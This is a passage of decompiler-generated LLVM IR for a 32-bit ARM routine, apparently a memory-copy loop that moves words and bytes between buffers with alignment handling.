dec_label_pc_13ccc.dec_label_pc_13ccc_crit_edge:  ; preds = %dec_label_pc_13ccc
  %v0_13ccc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_13ccc

dec_label_pc_13ce4:                               ; preds = %dec_label_pc_13ccc
  %v1_13ce4 = add i32 %v0_13cdc, -16
  %v3_13ce4 = add i32 %v0_13cdc, 2147483616
  %v4_13ce4 = and i32 %v1_13ce4, %v3_13ce4
  %v5_13ce4 = icmp slt i32 %v4_13ce4, 0
  store i1 %v5_13ce4, i1* %cpsr_v.global-to-local, align 1
  %v6_13ce4 = icmp slt i32 %v1_13ce4, 0
  store i1 %v6_13ce4, i1* %cpsr_n.global-to-local, align 1
  %v7_13ce4 = icmp eq i32 %v1_13ce4, 0
  store i1 %v7_13ce4, i1* %cpsr_z.global-to-local, align 1
  %v2_13ce8 = xor i1 %v6_13ce4, %v5_13ce4
  br i1 %v2_13ce8, label %bb137, label %bb136

bb136:                                            ; preds = %dec_label_pc_13ce4
  %v3_13ce8 = load i32, i32* @r1, align 4
  %v4_13ce8 = inttoptr i32 %v3_13ce8 to i32*
  %v5_13ce8 = load i32, i32* %v4_13ce8, align 4
  store i32 %v5_13ce8, i32* @r3, align 4
  %v6_13ce8 = add i32 %v3_13ce8, 4
  %v7_13ce8 = inttoptr i32 %v6_13ce8 to i32*
  %v8_13ce8 = load i32, i32* %v7_13ce8, align 4
  store i32 %v8_13ce8, i32* %r4.global-to-local, align 4
  %v9_13ce8 = add i32 %v3_13ce8, 8
  %v10_13ce8 = inttoptr i32 %v9_13ce8 to i32*
  %v11_13ce8 = load i32, i32* %v10_13ce8, align 4
  store i32 %v11_13ce8, i32* @ip, align 4
  %v12_13ce8 = add i32 %v3_13ce8, 12
  %v13_13ce8 = inttoptr i32 %v12_13ce8 to i32*
  %v14_13ce8 = load i32, i32* %v13_13ce8, align 4
  store i32 %v14_13ce8, i32* %lr.global-to-local, align 4
  %v15_13ce8 = add i32 %v3_13ce8, 16
  store i32 %v15_13ce8, i32* @r1, align 4
  %v4_13cec = inttoptr i32 %v12_13cd8 to i32*
  store i32 %v5_13ce8, i32* %v4_13cec, align 4
  %v6_13cec = add i32 %v0_13cd0, 36
  %v7_13cec = inttoptr i32 %v6_13cec to i32*
  %v8_13cec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v8_13cec, i32* %v7_13cec, align 4
  %v9_13cec = add i32 %v0_13cd0, 40
  %v10_13cec = inttoptr i32 %v9_13cec to i32*
  %v11_13cec = load i32, i32* @ip, align 4
  store i32 %v11_13cec, i32* %v10_13cec, align 4
  %v12_13cec = add i32 %v0_13cd0, 44
  %v13_13cec = inttoptr i32 %v12_13cec to i32*
  %v14_13cec = load i32, i32* %lr.global-to-local, align 4
  store i32 %v14_13cec, i32* %v13_13cec, align 4
  %v15_13cec = add i32 %v0_13cd0, 48
  store i32 %v15_13cec, i32* %r0.global-to-local, align 4
  %v3_13cf0 = load i32, i32* %r2.global-to-local, align 4
  %v4_13cf0 = add i32 %v3_13cf0, -16
  store i32 %v4_13cf0, i32* %r2.global-to-local, align 4
  br label %bb137

bb137:                                            ; preds = %dec_label_pc_13ce4, %bb136
  %v3_13d00101110 = phi i32 [ %v15_13cec, %bb136 ], [ %v12_13cd8, %dec_label_pc_13ce4 ]
  %v0_13cf8.pre = phi i32 [ %v4_13cf0, %bb136 ], [ %v1_13cdc, %dec_label_pc_13ce4 ]
  %v2_13cf4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13cf4, i32* @r4, align 4
  br label %dec_label_pc_13cf8

dec_label_pc_13cf8:                               ; preds = %dec_label_pc_13cc0, %bb137
  %v3_13d00100 = phi i32 [ %v0_13cd093, %dec_label_pc_13cc0 ], [ %v3_13d00101110, %bb137 ]
  %v0_13cf8 = phi i32 [ %v1_13cc0, %dec_label_pc_13cc0 ], [ %v0_13cf8.pre, %bb137 ]
  %v1_13cf8 = add i32 %v0_13cf8, 20
  store i32 %v1_13cf8, i32* %r2.global-to-local, align 4
  %v3_13cf8 = sub i32 0, %v0_13cf8
  %v4_13cf8 = and i32 %v1_13cf8, %v3_13cf8
  %v5_13cf8 = icmp slt i32 %v4_13cf8, 0
  store i1 %v5_13cf8, i1* %cpsr_v.global-to-local, align 1
  %v6_13cf8 = icmp slt i32 %v1_13cf8, 0
  store i1 %v6_13cf8, i1* %cpsr_n.global-to-local, align 1
  %v7_13cf8 = icmp eq i32 %v1_13cf8, 0
  store i1 %v7_13cf8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13cfc

dec_label_pc_13cfc:                               ; preds = %.thread114, %dec_label_pc_13cf8
  %v0_13d0c.pre157 = phi i32 [ %v0_13d0c.pre, %.thread114 ], [ %v1_13cf8, %dec_label_pc_13cf8 ]
  %v3_13d00 = phi i32 [ %v3_13d0098115, %.thread114 ], [ %v3_13d00100, %dec_label_pc_13cf8 ]
  %v1_13d04 = phi i1 [ %v1_13d08, %.thread114 ], [ %v5_13cf8, %dec_label_pc_13cf8 ]
  %v0_13d04 = phi i1 [ %v0_13d08, %.thread114 ], [ %v6_13cf8, %dec_label_pc_13cf8 ]
  %v2_13cfc = xor i1 %v1_13d04, %v0_13d04
  br i1 %v2_13cfc, label %.thread114, label %bb138

bb138:                                            ; preds = %dec_label_pc_13cfc
  %v3_13cfc = load i32, i32* @r1, align 4
  %v4_13cfc = inttoptr i32 %v3_13cfc to i32*
  %v5_13cfc = load i32, i32* %v4_13cfc, align 4
  store i32 %v5_13cfc, i32* @r3, align 4
  %v6_13cfc = add i32 %v3_13cfc, 4
  %v7_13cfc = inttoptr i32 %v6_13cfc to i32*
  %v8_13cfc = load i32, i32* %v7_13cfc, align 4
  store i32 %v8_13cfc, i32* @ip, align 4
  %v9_13cfc = add i32 %v3_13cfc, 8
  %v10_13cfc = inttoptr i32 %v9_13cfc to i32*
  %v11_13cfc = load i32, i32* %v10_13cfc, align 4
  store i32 %v11_13cfc, i32* %lr.global-to-local, align 4
  %v12_13cfc = add i32 %v3_13cfc, 12
  store i32 %v12_13cfc, i32* @r1, align 4
  %v4_13d00 = inttoptr i32 %v3_13d00 to i32*
  store i32 %v5_13cfc, i32* %v4_13d00, align 4
  %v6_13d00 = add i32 %v3_13d00, 4
  %v7_13d00 = inttoptr i32 %v6_13d00 to i32*
  %v8_13d00 = load i32, i32* @ip, align 4
  store i32 %v8_13d00, i32* %v7_13d00, align 4
  %v9_13d00 = add i32 %v3_13d00, 8
  %v10_13d00 = inttoptr i32 %v9_13d00 to i32*
  %v11_13d00 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_13d00, i32* %v10_13d00, align 4
  %v12_13d00 = add i32 %v3_13d00, 12
  store i32 %v12_13d00, i32* %r0.global-to-local, align 4
  %v3_13d04 = load i32, i32* %r2.global-to-local, align 4
  %v4_13d04 = add i32 %v3_13d04, -12
  store i32 %v4_13d04, i32* %r2.global-to-local, align 4
  %v6_13d04 = sub i32 11, %v3_13d04
  %v7_13d04 = and i32 %v6_13d04, %v3_13d04
  %v8_13d04 = icmp slt i32 %v7_13d04, 0
  store i1 %v8_13d04, i1* %cpsr_v.global-to-local, align 1
  %v9_13d04 = icmp slt i32 %v4_13d04, 0
  store i1 %v9_13d04, i1* %cpsr_n.global-to-local, align 1
  %v10_13d04 = icmp eq i32 %v3_13d04, 12
  store i1 %v10_13d04, i1* %cpsr_z.global-to-local, align 1
  br label %.thread114

.thread114:                                       ; preds = %dec_label_pc_13cfc, %bb138
  %v0_13d0c.pre = phi i32 [ %v4_13d04, %bb138 ], [ %v0_13d0c.pre157, %dec_label_pc_13cfc ]
  %v3_13d0098115 = phi i32 [ %v12_13d00, %bb138 ], [ %v3_13d00, %dec_label_pc_13cfc ]
  %v1_13d08 = phi i1 [ %v8_13d04, %bb138 ], [ %v1_13d04, %dec_label_pc_13cfc ]
  %v0_13d08 = phi i1 [ %v9_13d04, %bb138 ], [ %v0_13d04, %dec_label_pc_13cfc ]
  %v2_13d08 = xor i1 %v1_13d08, %v0_13d08
  br i1 %v2_13d08, label %dec_label_pc_13d0c, label %dec_label_pc_13cfc

dec_label_pc_13d0c:                               ; preds = %.thread114, %dec_label_pc_13cb8
  %v4_13d1c = phi i32 [ %v0_13cd093, %dec_label_pc_13cb8 ], [ %v3_13d0098115, %.thread114 ]
  %v0_13d0c = phi i32 [ %v1_13cb8, %dec_label_pc_13cb8 ], [ %v0_13d0c.pre, %.thread114 ]
  %v1_13d0c = add i32 %v0_13d0c, 8
  store i32 %v1_13d0c, i32* %r2.global-to-local, align 4
  %v3_13d0c = sub i32 0, %v0_13d0c
  %v4_13d0c = and i32 %v1_13d0c, %v3_13d0c
  %v5_13d0c = icmp slt i32 %v4_13d0c, 0
  store i1 %v5_13d0c, i1* %cpsr_v.global-to-local, align 1
  %v6_13d0c = icmp slt i32 %v1_13d0c, 0
  store i1 %v6_13d0c, i1* %cpsr_n.global-to-local, align 1
  %v7_13d0c = icmp eq i32 %v1_13d0c, 0
  store i1 %v7_13d0c, i1* %cpsr_z.global-to-local, align 1
  %v2_13d10 = xor i1 %v6_13d0c, %v5_13d0c
  br i1 %v2_13d10, label %bb140, label %dec_label_pc_13d14

dec_label_pc_13d14:                               ; preds = %dec_label_pc_13d0c
  %v1_13d14 = add i32 %v0_13d0c, 4
  store i32 %v1_13d14, i32* %r2.global-to-local, align 4
  %v3_13d14 = sub i32 -5, %v0_13d0c
  %v4_13d14 = and i32 %v3_13d14, %v1_13d0c
  %v5_13d14 = icmp slt i32 %v4_13d14, 0
  store i1 %v5_13d14, i1* %cpsr_v.global-to-local, align 1
  %v6_13d14 = icmp slt i32 %v1_13d14, 0
  store i1 %v6_13d14, i1* %cpsr_n.global-to-local, align 1
  %v7_13d14 = icmp eq i32 %v1_13d0c, 4
  store i1 %v7_13d14, i1* %cpsr_z.global-to-local, align 1
  %v2_13d18 = xor i1 %v6_13d14, %v5_13d14
  %v3_13d18 = load i32, i32* @r1, align 4
  %v4_13d18 = inttoptr i32 %v3_13d18 to i32*
  %v5_13d18 = load i32, i32* %v4_13d18, align 4
  store i32 %v5_13d18, i32* @r3, align 4
  %v7_13d18 = add i32 %v3_13d18, 4
  br i1 %v2_13d18, label %.thread121, label %bb139

.thread121:                                       ; preds = %dec_label_pc_13d14
  store i32 %v7_13d18, i32* @r1, align 4
  %v5_13d1c = inttoptr i32 %v4_13d1c to i32*
  store i32 %v5_13d18, i32* %v5_13d1c, align 4
  %v6_13d1c = load i32, i32* %r0.global-to-local, align 4
  %v7_13d1c = add i32 %v6_13d1c, 4
  store i32 %v7_13d1c, i32* %r0.global-to-local, align 4
  %v0_13d2c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb140

bb139:                                            ; preds = %dec_label_pc_13d14
  %v7_13d20 = inttoptr i32 %v7_13d18 to i32*
  %v8_13d20 = load i32, i32* %v7_13d20, align 4
  store i32 %v8_13d20, i32* @ip, align 4
  %v9_13d20 = add i32 %v3_13d18, 8
  store i32 %v9_13d20, i32* @r1, align 4
  %v4_13d24 = inttoptr i32 %v4_13d1c to i32*
  store i32 %v5_13d18, i32* %v4_13d24, align 4
  %v6_13d24 = add i32 %v4_13d1c, 4
  %v7_13d24 = inttoptr i32 %v6_13d24 to i32*
  %v8_13d24 = load i32, i32* @ip, align 4
  store i32 %v8_13d24, i32* %v7_13d24, align 4
  %v9_13d24 = add i32 %v4_13d1c, 8
  store i32 %v9_13d24, i32* %r0.global-to-local, align 4
  %v3_13d28 = load i32, i32* %r2.global-to-local, align 4
  %v4_13d28 = add i32 %v3_13d28, -4
  store i32 %v4_13d28, i32* %r2.global-to-local, align 4
  br label %bb140

bb140:                                            ; preds = %.thread121, %.thread127, %dec_label_pc_13d0c, %bb, %dec_label_pc_13edc, %dec_label_pc_13e70, %dec_label_pc_13e04, %bb139
  %v0_13d2c = phi i32 [ %v0_13d2c.pre, %.thread121 ], [ %v2_13d7c, %.thread127 ], [ %v1_13d0c, %dec_label_pc_13d0c ], [ %v2_13ca0, %bb ], [ %v0_13d2c60, %dec_label_pc_13edc ], [ %v0_13d2c59, %dec_label_pc_13e70 ], [ %v0_13d2c58, %dec_label_pc_13e04 ], [ %v4_13d28, %bb139 ]
  %v1_13d2c = add i32 %v0_13d2c, 4
  store i32 %v1_13d2c, i32* %r2.global-to-local, align 4
  %v3_13d2c = sub i32 0, %v0_13d2c
  %v4_13d2c = and i32 %v1_13d2c, %v3_13d2c
  %v5_13d2c = icmp slt i32 %v4_13d2c, 0
  store i1 %v5_13d2c, i1* %cpsr_v.global-to-local, align 1
  %v6_13d2c = icmp slt i32 %v1_13d2c, 0
  store i1 %v6_13d2c, i1* %cpsr_n.global-to-local, align 1
  %v7_13d2c = icmp eq i32 %v1_13d2c, 0
  store i1 %v7_13d2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13d2c, label %bb141, label %bb140.bb142_crit_edge

bb140.bb142_crit_edge:                            ; preds = %bb140
  %v0_13d34.pre = load i32, i32* @r3, align 4
  br label %bb142

bb141:                                            ; preds = %bb140
  %v3_13d30 = load i8*, i8** %stack_var_-8, align 4
  %v4_13d30 = ptrtoint i8* %v3_13d30 to i32
  store i32 %v4_13d30, i32* %r0.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %bb140.bb142_crit_edge, %bb141
  %v0_13d34 = phi i32 [ %v0_13d34.pre, %bb140.bb142_crit_edge ], [ %v8_13c9c, %bb141 ]
  call void @__pseudo_cond_branch(i1 %v7_13d2c, i32 %v0_13d34)
  %v0_13d38 = load i32, i32* %r2.global-to-local, align 4
  %v1_13d38 = add i32 %v0_13d38, -2
  %v3_13d38 = sub i32 1, %v0_13d38
  %v4_13d38 = and i32 %v3_13d38, %v0_13d38
  %v5_13d38 = icmp slt i32 %v4_13d38, 0
  store i1 %v5_13d38, i1* %cpsr_v.global-to-local, align 1
  %v6_13d38 = icmp slt i32 %v1_13d38, 0
  store i1 %v6_13d38, i1* %cpsr_n.global-to-local, align 1
  %v7_13d38 = icmp eq i32 %v0_13d38, 2
  store i1 %v7_13d38, i1* %cpsr_z.global-to-local, align 1
  %v0_13d3c = load i32, i32* @r1, align 4
  %v1_13d3c = inttoptr i32 %v0_13d3c to i8*
  %v2_13d3c = load i8, i8* %v1_13d3c, align 1
  %v5_13d3c = add i32 %v0_13d3c, 1
  store i32 %v5_13d3c, i32* %r1.global-to-local, align 4
  %v2_13d40 = load i32, i32* %r0.global-to-local, align 4
  %v3_13d40 = inttoptr i32 %v2_13d40 to i8*
  store i8 %v2_13d3c, i8* %v3_13d40, align 1
  %v4_13d40 = load i32, i32* %r0.global-to-local, align 4
  %v5_13d40 = add i32 %v4_13d40, 1
  store i32 %v5_13d40, i32* %r0.global-to-local, align 4
  %v0_13d44 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_13d44 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_13d44 = xor i1 %v0_13d44, %v1_13d44
  br i1 %v2_13d44, label %.thread124, label %bb143

bb143:                                            ; preds = %bb142
  %v3_13d44 = load i32, i32* %r1.global-to-local, align 4
  %v4_13d44 = inttoptr i32 %v3_13d44 to i8*
  %v5_13d44 = load i8, i8* %v4_13d44, align 1
  %v8_13d44 = add i32 %v3_13d44, 1
  store i32 %v8_13d44, i32* %r1.global-to-local, align 4
  %v6_13d48 = inttoptr i32 %v5_13d40 to i8*
  store i8 %v5_13d44, i8* %v6_13d48, align 1
  %v7_13d48 = load i32, i32* %r0.global-to-local, align 4
  %v8_13d48 = add i32 %v7_13d48, 1
  store i32 %v8_13d48, i32* %r0.global-to-local, align 4
  %v1_13d4c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_13d4c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread124

.thread124:                                       ; preds = %bb142, %bb143
  %v7_13d50 = phi i32 [ %v8_13d48, %bb143 ], [ %v5_13d40, %bb142 ]
  %v2_13d50 = phi i1 [ %v2_13d4c.pre, %bb143 ], [ %v1_13d44, %bb142 ]
  %v1_13d50 = phi i1 [ %v1_13d4c.pre, %bb143 ], [ %v0_13d44, %bb142 ]
  %v0_13d4c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_13d4c = xor i1 %v2_13d50, %v1_13d50
  %v4_13d4c = or i1 %v0_13d4c, %v3_13d4c
  br i1 %v4_13d4c, label %.thread125, label %bb144

bb144:                                            ; preds = %.thread124
  %v5_13d4c = load i32, i32* %r1.global-to-local, align 4
  %v6_13d4c = inttoptr i32 %v5_13d4c to i8*
  %v7_13d4c = load i8, i8* %v6_13d4c, align 1
  %v10_13d4c = add i32 %v5_13d4c, 1
  store i32 %v10_13d4c, i32* %r1.global-to-local, align 4
  %v8_13d50 = inttoptr i32 %v7_13d50 to i8*
  store i8 %v7_13d4c, i8* %v8_13d50, align 1
  %v9_13d50 = load i32, i32* %r0.global-to-local, align 4
  %v10_13d50 = add i32 %v9_13d50, 1
  store i32 %v10_13d50, i32* %r0.global-to-local, align 4
  br label %.thread125

.thread125:                                       ; preds = %.thread124, %bb144
  %v2_13d54 = load i8*, i8** %stack_var_-8, align 4
  %v3_13d54 = ptrtoint i8* %v2_13d54 to i32
  store i32 %v3_13d54, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_13c9c)
  %v0_13d5c.pre = load i32, i32* @ip, align 4
  %v0_13d64.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_13d68.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13d5c

dec_label_pc_13d5c:                               ; preds = %dec_label_pc_13ca8, %.thread125
  %v2_13d68 = phi i32 [ %v1_13c90, %dec_label_pc_13ca8 ], [ %v2_13d68.pre, %.thread125 ]
  %v0_13d64 = phi i32 [ %v0_13c90, %dec_label_pc_13ca8 ], [ %v0_13d64.pre, %.thread125 ]
  %v0_13d5c = phi i32 [ %v1_13ca8, %dec_label_pc_13ca8 ], [ %v0_13d5c.pre, %.thread125 ]
  %v1_13d5c = sub i32 4, %v0_13d5c
  store i32 %v1_13d5c, i32* @ip, align 4
  %v1_13d60 = add i32 %v1_13d5c, -2
  %v3_13d60 = sub i32 1, %v1_13d5c
  %v4_13d60 = and i32 %v3_13d60, %v1_13d5c
  %v5_13d60 = icmp slt i32 %v4_13d60, 0
  store i1 %v5_13d60, i1* %cpsr_v.global-to-local, align 1
  %v6_13d60 = icmp slt i32 %v1_13d60, 0
  store i1 %v6_13d60, i1* %cpsr_n.global-to-local, align 1
  %v7_13d60 = icmp eq i32 %v1_13d5c, 2
  store i1 %v7_13d60, i1* %cpsr_z.global-to-local, align 1
  %v1_13d64 = inttoptr i32 %v0_13d64 to i8*
  %v2_13d64 = load i8, i8* %v1_13d64, align 1
  %v3_13d64 = zext i8 %v2_13d64 to i32
  store i32 %v3_13d64, i32* @r3, align 4
  %v5_13d64 = add i32 %v0_13d64, 1
  store i32 %v5_13d64, i32* @r1, align 4
  %v3_13d68 = inttoptr i32 %v2_13d68 to i8*
  store i8 %v2_13d64, i8* %v3_13d68, align 1
  %v4_13d68 = load i32, i32* %r0.global-to-local, align 4
  %v5_13d68 = add i32 %v4_13d68, 1
  store i32 %v5_13d68, i32* %r0.global-to-local, align 4
  %v0_13d6c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_13d6c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_13d6c = xor i1 %v0_13d6c, %v1_13d6c
  br i1 %v2_13d6c, label %.thread126, label %bb145

bb145:                                            ; preds = %dec_label_pc_13d5c
  %v3_13d6c = load i32, i32* @r1, align 4
  %v4_13d6c = inttoptr i32 %v3_13d6c to i8*
  %v5_13d6c = load i8, i8* %v4_13d6c, align 1
  %v6_13d6c = zext i8 %v5_13d6c to i32
  store i32 %v6_13d6c, i32* @r3, align 4
  %v8_13d6c = add i32 %v3_13d6c, 1
  store i32 %v8_13d6c, i32* @r1, align 4
  %v6_13d70 = inttoptr i32 %v5_13d68 to i8*
  store i8 %v5_13d6c, i8* %v6_13d70, align 1
  %v7_13d70 = load i32, i32* %r0.global-to-local, align 4
  %v8_13d70 = add i32 %v7_13d70, 1
  store i32 %v8_13d70, i32* %r0.global-to-local, align 4
  %v1_13d74.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_13d74.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread126

.thread126:                                       ; preds = %dec_label_pc_13d5c, %bb145
  %v7_13d78 = phi i32 [ %v8_13d70, %bb145 ], [ %v5_13d68, %dec_label_pc_13d5c ]
  %v2_13d78 = phi i1 [ %v2_13d74.pre, %bb145 ], [ %v1_13d6c, %dec_label_pc_13d5c ]
  %v1_13d78 = phi i1 [ %v1_13d74.pre, %bb145 ], [ %v0_13d6c, %dec_label_pc_13d5c ]
  %v0_13d74 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_13d74 = xor i1 %v2_13d78, %v1_13d78
  %v4_13d74 = or i1 %v0_13d74, %v3_13d74
  br i1 %v4_13d74, label %.thread127, label %bb146

bb146:                                            ; preds = %.thread126
  %v5_13d74 = load i32, i32* @r1, align 4
  %v6_13d74 = inttoptr i32 %v5_13d74 to i8*
  %v7_13d74 = load i8, i8* %v6_13d74, align 1
  %v8_13d74 = zext i8 %v7_13d74 to i32
  store i32 %v8_13d74, i32* @r3, align 4
  %v10_13d74 = add i32 %v5_13d74, 1
  store i32 %v10_13d74, i32* @r1, align 4
  %v8_13d78 = inttoptr i32 %v7_13d78 to i8*
  store i8 %v7_13d74, i8* %v8_13d78, align 1
  %v9_13d78 = load i32, i32* %r0.global-to-local, align 4
  %v10_13d78 = add i32 %v9_13d78, 1
  store i32 %v10_13d78, i32* %r0.global-to-local, align 4
  br label %.thread127

.thread127:                                       ; preds = %.thread126, %bb146
  %v0_13eac76 = phi i32 [ %v10_13d78, %bb146 ], [ %v7_13d78, %.thread126 ]
  %v0_13d7c = load i32, i32* %r2.global-to-local, align 4
  %v1_13d7c = load i32, i32* @ip, align 4
  %v2_13d7c = sub i32 %v0_13d7c, %v1_13d7c
  store i32 %v2_13d7c, i32* %r2.global-to-local, align 4
  %v4_13d7c = xor i32 %v1_13d7c, %v0_13d7c
  %v5_13d7c = xor i32 %v2_13d7c, %v0_13d7c
  %v6_13d7c = and i32 %v5_13d7c, %v4_13d7c
  %v7_13d7c = icmp slt i32 %v6_13d7c, 0
  store i1 %v7_13d7c, i1* %cpsr_v.global-to-local, align 1
  %v8_13d7c = icmp slt i32 %v2_13d7c, 0
  store i1 %v8_13d7c, i1* %cpsr_n.global-to-local, align 1
  %v9_13d7c = icmp eq i32 %v0_13d7c, %v1_13d7c
  store i1 %v9_13d7c, i1* %cpsr_z.global-to-local, align 1
  %v2_13d80 = xor i1 %v8_13d7c, %v7_13d7c
  br i1 %v2_13d80, label %bb140, label %dec_label_pc_13d84

dec_label_pc_13d84:                               ; preds = %.thread127
  %v0_13d84 = load i32, i32* @r1, align 4
  %v1_13d84 = urem i32 %v0_13d84, 4
  store i32 %v1_13d84, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13d84 = icmp eq i32 %v1_13d84, 0
  store i1 %v2_13d84, i1* %cpsr_z.global-to-local, align 1
  %extract.t130 = trunc i32 %v0_13d84 to i2
  br i1 %v2_13d84, label %dec_label_pc_13cb8, label %dec_label_pc_13d8c

dec_label_pc_13d8c:                               ; preds = %dec_label_pc_13cb0, %dec_label_pc_13d84
  %v0_13eac75 = phi i32 [ %v1_13c90, %dec_label_pc_13cb0 ], [ %v0_13eac76, %dec_label_pc_13d84 ]
  %v0_13e14 = phi i32 [ %v2_13ca0, %dec_label_pc_13cb0 ], [ %v2_13d7c, %dec_label_pc_13d84 ]
  %v0_13d94.off0 = phi i2 [ %extract.t, %dec_label_pc_13cb0 ], [ %extract.t130, %dec_label_pc_13d84 ]
  %v0_13d8c = phi i32 [ %v0_13c90, %dec_label_pc_13cb0 ], [ %v0_13d84, %dec_label_pc_13d84 ]
  %v1_13d8c = and i32 %v0_13d8c, -4
  store i32 %v1_13d8c, i32* %r1.global-to-local, align 4
  %v1_13d90 = inttoptr i32 %v1_13d8c to i32*
  %v2_13d90 = load i32, i32* %v1_13d90, align 4
  store i32 %v2_13d90, i32* %lr.global-to-local, align 4
  %v4_13d90 = add i32 %v1_13d8c, 4
  store i32 %v4_13d90, i32* %r1.global-to-local, align 4
  %v1_13e0c = add i32 %v0_13e14, -12
  %v3_13e0c = sub i32 11, %v0_13e14
  %v4_13e0c = and i32 %v3_13e0c, %v0_13e14
  %v5_13e0c = icmp slt i32 %v4_13e0c, 0
  store i1 %v5_13e0c, i1* %cpsr_v.global-to-local, align 1
  %v6_13e0c = icmp slt i32 %v1_13e0c, 0
  store i1 %v6_13e0c, i1* %cpsr_n.global-to-local, align 1
  %v7_13e0c = icmp eq i32 %v0_13e14, 12
  store i1 %v7_13e0c, i1* %cpsr_z.global-to-local, align 1
  %v2_13e10 = xor i1 %v6_13e0c, %v5_13e0c
  switch i2 %v0_13d94.off0, label %dec_label_pc_13da0 [
    i2 -1, label %dec_label_pc_13e78
    i2 -2, label %dec_label_pc_13e0c
  ]

dec_label_pc_13da0:                               ; preds = %dec_label_pc_13d8c
  br i1 %v2_13e10, label %dec_label_pc_13dec, label %dec_label_pc_13da8

dec_label_pc_13da8:                               ; preds = %dec_label_pc_13da0
  store i32 %v1_13e0c, i32* %r2.global-to-local, align 4
  %v3_13dac = load i32, i32* @r4, align 4
  store i32 %v3_13dac, i32* %stack_var_-16, align 4
  %v6_13dac = load i32, i32* @r5, align 4
  store i32 %v6_13dac, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13db0

dec_label_pc_13db0:                               ; preds = %dec_label_pc_13db0.dec_label_pc_13db0_crit_edge, %dec_label_pc_13da8
  %v0_13dd4 = phi i32 [ %v12_13dd4, %dec_label_pc_13db0.dec_label_pc_13db0_crit_edge ], [ %v0_13eac75, %dec_label_pc_13da8 ]
  %v0_13db4 = phi i32 [ %v0_13db4.pre, %dec_label_pc_13db0.dec_label_pc_13db0_crit_edge ], [ %v4_13d90, %dec_label_pc_13da8 ]
  %v0_13db0 = phi i32 [ %v0_13db0.pre, %dec_label_pc_13db0.dec_label_pc_13db0_crit_edge ], [ %v2_13d90, %dec_label_pc_13da8 ]
  %v3_13db0 = udiv i32 %v0_13db0, 256
  %v1_13db4 = inttoptr i32 %v0_13db4 to i32*
  %v2_13db4 = load i32, i32* %v1_13db4, align 4
  store i32 %v2_13db4, i32* %r4.global-to-local, align 4
  %v3_13db4 = add i32 %v0_13db4, 4
  %v4_13db4 = inttoptr i32 %v3_13db4 to i32*
  %v5_13db4 = load i32, i32* %v4_13db4, align 4
  store i32 %v5_13db4, i32* %r5.global-to-local, align 4
  %v6_13db4 = add i32 %v0_13db4, 8
  %v7_13db4 = inttoptr i32 %v6_13db4 to i32*
  %v8_13db4 = load i32, i32* %v7_13db4, align 4
  store i32 %v8_13db4, i32* %ip.global-to-local, align 4
  %v9_13db4 = add i32 %v0_13db4, 12
  %v10_13db4 = inttoptr i32 %v9_13db4 to i32*
  %v11_13db4 = load i32, i32* %v10_13db4, align 4
  store i32 %v11_13db4, i32* %lr.global-to-local, align 4
  %v12_13db4 = add i32 %v0_13db4, 16
  store i32 %v12_13db4, i32* %r1.global-to-local, align 4
  %v4_13db8 = mul i32 %v2_13db4, 16777216
  %v5_13db8 = or i32 %v4_13db8, %v3_13db0
  store i32 %v5_13db8, i32* @r3, align 4
  %v3_13dbc = udiv i32 %v2_13db4, 256
  %v4_13dc0 = mul i32 %v5_13db4, 16777216
  %v5_13dc0 = or i32 %v4_13dc0, %v3_13dbc
  store i32 %v5_13dc0, i32* %r4.global-to-local, align 4
  %v3_13dc4 = udiv i32 %v5_13db4, 256
  %v4_13dc8 = mul i32 %v8_13db4, 16777216
  %v5_13dc8 = or i32 %v4_13dc8, %v3_13dc4
  store i32 %v5_13dc8, i32* %r5.global-to-local, align 4
  %v3_13dcc = udiv i32 %v8_13db4, 256
  %v4_13dd0 = mul i32 %v11_13db4, 16777216
  %v5_13dd0 = or i32 %v4_13dd0, %v3_13dcc
  store i32 %v5_13dd0, i32* @ip, align 4
  %v1_13dd4 = inttoptr i32 %v0_13dd4 to i32*
  store i32 %v5_13db8, i32* %v1_13dd4, align 4
  %v3_13dd4 = add i32 %v0_13dd4, 4
  %v4_13dd4 = inttoptr i32 %v3_13dd4 to i32*
  %v5_13dd4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13dd4, i32* %v4_13dd4, align 4
  %v6_13dd4 = add i32 %v0_13dd4, 8
  %v7_13dd4 = inttoptr i32 %v6_13dd4 to i32*
  %v8_13dd4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_13dd4, i32* %v7_13dd4, align 4
  %v9_13dd4 = add i32 %v0_13dd4, 12
  %v10_13dd4 = inttoptr i32 %v9_13dd4 to i32*
  %v11_13dd4 = load i32, i32* @ip, align 4
  store i32 %v11_13dd4, i32* %v10_13dd4, align 4
  %v12_13dd4 = add i32 %v0_13dd4, 16
  store i32 %v12_13dd4, i32* %r0.global-to-local, align 4
  %v0_13dd8 = load i32, i32* %r2.global-to-local, align 4
  %v1_13dd8 = add i32 %v0_13dd8, -16
  store i32 %v1_13dd8, i32* %r2.global-to-local, align 4
  %v3_13dd8 = sub i32 15, %v0_13dd8
  %v4_13dd8 = and i32 %v3_13dd8, %v0_13dd8
  %v5_13dd8 = icmp slt i32 %v4_13dd8, 0
  %v6_13dd8 = icmp slt i32 %v1_13dd8, 0
  %v2_13ddc = xor i1 %v6_13dd8, %v5_13dd8
